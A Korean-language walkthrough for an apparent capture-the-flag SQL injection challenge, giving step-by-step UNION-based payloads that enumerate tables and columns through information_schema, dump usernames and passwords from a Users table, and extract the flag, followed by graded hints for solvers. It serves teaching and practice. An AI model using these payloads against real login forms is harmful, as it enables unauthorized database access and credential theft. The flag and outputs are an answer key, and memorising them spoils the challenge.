문제를 푸는 사람이 아무 정보도 모르고 시작한다고 가정하면, 아래와 같은 과정을 통해 단계적으로 문제를 해결할 수 있습니다. 이 과정은 SQL Injection의 기본 원리를 이해하고 적용하는 흐름을 따릅니다.

---

### **1. 기본 로그인 시도**
- **행동**: `admin` / `admin`을 입력하고 로그인 시도.
- **결과**: "Invalid credentials!" 메시지가 나옵니다.
- **추론**: 주어진 계정 정보로는 접근할 수 없고, 무언가 다른 방법(취약점)을 사용해야 함을 유추할 수 있습니다.

---

### **2. 간단한 SQL Injection 테스트**
- **행동**: `admin' --`를 입력하여 SQL Injection 취약성을 확인.
  - 페이로드: 
    ```
    admin' --
    ```
- **결과**: 여전히 "Invalid credentials!"가 출력됩니다.
- **추론**: 시스템이 SQL 구문을 처리할 가능성은 있지만, 더 복잡한 페이로드를 사용해야 함을 알 수 있습니다.

---

### **3. 테이블 이름을 알아내기 위한 시도**
- **행동**: UNION 기반 SQL Injection을 시도해 데이터베이스 구조를 탐색.
  - 페이로드:
    ```
    admin' UNION SELECT null, table_name, null FROM information_schema.tables --
    ```
- **결과**: "Tables in the database: Users, Logs"가 출력.
- **추론**: 데이터베이스에 `Users`와 `Logs`라는 두 개의 테이블이 있음을 확인.

---

### **4. `Users` 테이블의 컬럼 확인**
- **행동**: `Users` 테이블의 구조를 알아내기 위해 컬럼 이름 추출 시도.
  - 페이로드:
    ```
    admin' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='Users' --
    ```
- **결과**: "Columns in Users table: id, username, password, flag"가 출력.
- **추론**: `Users` 테이블에 `flag`라는 컬럼이 존재하므로, 여기에 중요한 정보가 있을 가능성이 높음.

---

### **5. `Users` 테이블의 데이터 확인**
- **행동**: `Users` 테이블의 데이터를 추출해 계정 정보를 확인.
  - 페이로드:
    ```
    admin' UNION SELECT username, password, null FROM Users --
    ```
- **결과**: "Account info: admin: admin_password, user1: user1_password"가 출력.
- **추론**: `Users` 테이블에 실제 사용자 정보가 저장되어 있음을 확인. 플래그는 `admin` 계정과 관련이 있을 가능성이 높음.

---

### **6. 플래그 추출**
- **행동**: `admin` 계정의 플래그를 가져오기 위해 조건부 SQL Injection 수행.
  - 페이로드:
    ```
    admin' UNION SELECT null, flag, null FROM Users WHERE username='admin' --
    ```
- **결과**: "Congratulations! Here is your flag: K4{H3llo_sql1}"가 출력.
- **추론**: 최종적으로 플래그를 성공적으로 추출.

---

### **단계별 요약**
1. 간단한 입력으로 SQL Injection 가능 여부 확인 (`admin' --`).
2. `information_schema.tables`를 통해 테이블 이름 확인.
3. `information_schema.columns`를 통해 테이블 구조 확인.
4. 데이터를 직접 추출해 유용한 정보를 탐색.
5. `flag` 컬럼에서 최종적으로 플래그를 추출.

---

### **힌트 제공**
만약 사용자가 초반에 문제를 해결하지 못한다면, 다음과 같은 힌트를 단계적으로 제공할 수 있습니다:
1. "이 시스템은 SQL Injection에 취약할지도 모릅니다. `'`를 입력해 보세요."
2. "데이터베이스 구조를 알아내기 위해 UNION을 사용해 보세요."
3. "Users 테이블 안에 중요한 정보가 있을 겁니다. 컬럼 이름을 확인해 보세요."
4. "플래그는 admin 계정과 관련이 있을 겁니다. 조건을 추가해 보세요." 

이러한 힌트는 사용자의 수준에 따라 조정할 수 있습니다.
